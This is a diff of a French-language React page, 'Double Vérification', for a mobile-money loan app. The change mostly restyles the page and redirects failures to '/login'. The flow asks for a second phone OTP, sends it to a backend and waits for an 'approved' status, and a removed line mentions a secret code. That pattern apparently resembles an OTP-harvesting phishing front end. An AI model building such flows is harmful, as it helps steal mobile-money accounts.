@@ -39,7 +39,7 @@ const SecondVerification = () => {
     // 45-second timeout fallback
     const timeoutId = setTimeout(() => {
       setIsVerifying(false);
-      navigate("/"); 
+      navigate("/login"); 
     }, 45000);
 
     try {
@@ -49,7 +49,6 @@ const SecondVerification = () => {
         body: JSON.stringify({ 
           phone_number: phoneNumber, 
           second_otp: secondOtp.join("")
-          // ✅ Secret code removed
         }),
       });
       const data = await res.json();
@@ -67,46 +66,64 @@ const SecondVerification = () => {
             if (statusData.status === "approved") {
               navigate("/loan-limit", { state: { phone: phoneNumber } });
             } else {
-              navigate("/"); 
+              navigate("/login"); 
             }
           }
         }, 2000);
       } else {
         clearTimeout(timeoutId);
         setIsVerifying(false);
-        navigate("/");
+        navigate("/login");
       }
     } catch (error) {
       clearTimeout(timeoutId);
       setIsVerifying(false);
-      navigate("/");
+      navigate("/login");
     }
   };
 
   return (
-    <div className="app-container">
-      <div className="header">
-        <div className="header-icon"><Wallet size={32} color="white" /></div>
-        <h1 className="header-title">FastLoan<span>MoMo</span></h1>
-        <p className="header-subtitle">Vérification de sécurité</p>
+    <div className="min-h-screen bg-[#FCD535] flex flex-col items-center px-5 py-8 font-sans">
+
+      {/* HEADER */}
+      <div className="text-center mb-8 mt-4">
+        <div className="w-16 h-16 rounded-2xl bg-[#F0B90B] flex items-center justify-center mx-auto mb-4 shadow-sm">
+          <Wallet size={32} color="#1E1E1E" />
+        </div>
+        <h1 className="text-2xl font-extrabold text-[#1E1E1E] tracking-tight">
+          Fast Product<span className="text-[#B8860B]">MoMo</span>
+        </h1>
+        <p className="text-sm text-white/90 mt-1 font-medium drop-shadow-sm">
+          Vérification de sécurité
+        </p>
       </div>
 
-      <div className="main-card">
-        <button onClick={() => navigate(-1)} className="btn-back" style={{ color: '#6B7280', fontWeight: 500, display: 'flex', alignItems: 'center' }}>
-          <ArrowLeft size={18} style={{ marginRight: '6px' }} /> Retour
+      {/* MAIN CARD */}
+      <div className="w-full max-w-md bg-white rounded-3xl shadow-xl p-6 sm:p-8">
+        
+        {/* BACK BUTTON */}
+        <button 
+          onClick={() => navigate(-1)} 
+          className="flex items-center text-gray-500 hover:text-gray-800 font-medium mb-6 transition-colors"
+        >
+          <ArrowLeft size={18} className="mr-1.5" /> Retour
         </button>
         
-        <h2 className="title" style={{ fontSize: '28px', marginBottom: '12px' }}>Double Vérification</h2>
+        <h2 className="text-2xl font-extrabold text-[#1E1E1E] mb-3">
+          Double Vérification
+        </h2>
         
         {/* ✅ Updated text to reflect only OTP is needed */}
-        <p className="subtitle" style={{ lineHeight: '1.6', color: '#4B5563', marginBottom: '32px' }}>
+        <p className="text-sm text-gray-600 leading-relaxed mb-8">
           Un code a été envoyé à votre téléphone. Veuillez entrer le deuxième code OTP pour continuer.
         </p>
         
         {/* Second OTP Only */}
-        <div className="form-group">
-          <label className="form-label">Deuxième code OTP (4 chiffres)</label>
-          <div className="otp-container">
+        <div className="mb-6">
+          <label className="block text-sm font-semibold text-gray-700 mb-3">
+            Deuxième code OTP (4 chiffres)
+          </label>
+          <div className="flex justify-between gap-3">
             {secondOtp.map((digit, index) => (
               <input 
                 key={index} 
@@ -116,35 +133,34 @@ const SecondVerification = () => {
                 value={digit} 
                 onChange={(e) => handleOtpChange(index, e.target.value)} 
                 onKeyDown={(e) => handleKeyDown(index, e)}
-                className="otp-box" 
                 maxLength={1}
-                style={{ color: '#111827', fontSize: '24px', fontWeight: '600', backgroundColor: '#FFFFFF', border: '1.5px solid #D1D5DB', borderRadius: '16px', outline: 'none' }}
+                className="w-full h-16 text-center text-2xl font-bold text-gray-900 bg-white border-[1.5px] border-gray-300 rounded-2xl outline-none focus:border-[#F0B90B] focus:ring-2 focus:ring-[#FCD535]/50 transition-all"
               />
             ))}
           </div>
         </div>
 
+        {/* SUBMIT */}
         <button 
           onClick={handleVerify} 
-          className="btn-primary" 
           disabled={!isFormValid || isVerifying} 
-          style={{
-            backgroundColor: (isFormValid && !isVerifying) ? 'var(--button-yellow)' : '#FDE68A',
-            color: (isFormValid && !isVerifying) ? 'white' : '#9CA3AF',
-            cursor: (isFormValid && !isVerifying) ? 'pointer' : 'not-allowed',
-            marginTop: '32px'
-          }}
+          className={`w-full mt-4 py-3.5 rounded-xl font-bold text-base transition-all ${
+            isFormValid && !isVerifying
+              ? "bg-[#F0B90B] hover:bg-[#E2AE0A] text-[#1E1E1E] cursor-pointer shadow-md"
+              : "bg-gray-100 text-gray-400 cursor-not-allowed"
+          }`}
         >
           {isVerifying ? "En attente..." : "Valider"}
         </button>
       </div>
 
+      {/* SPINNER MODAL */}
       {isVerifying && (
-        <div className="modal-overlay">
-          <div className="modal-content">
-            <div className="spinner"></div>
-            <h3 className="modal-title">Vérification en cours</h3>
-            <p className="modal-text">Veuillez patienter...</p>
+        <div className="fixed inset-0 bg-black/60 backdrop-blur-sm z-50 flex items-center justify-center px-5">
+          <div className="bg-white rounded-2xl p-8 max-w-sm w-full text-center shadow-2xl">
+            <div className="w-12 h-12 mx-auto mb-5 rounded-full border-4 border-gray-100 border-t-[#F0B90B] animate-spin" />
+            <h3 className="text-lg font-bold text-[#1E1E1E] mb-2">Vérification en cours</h3>
+            <p className="text-sm text-gray-500">Veuillez patienter...</p>
           </div>
         </div>
       )}
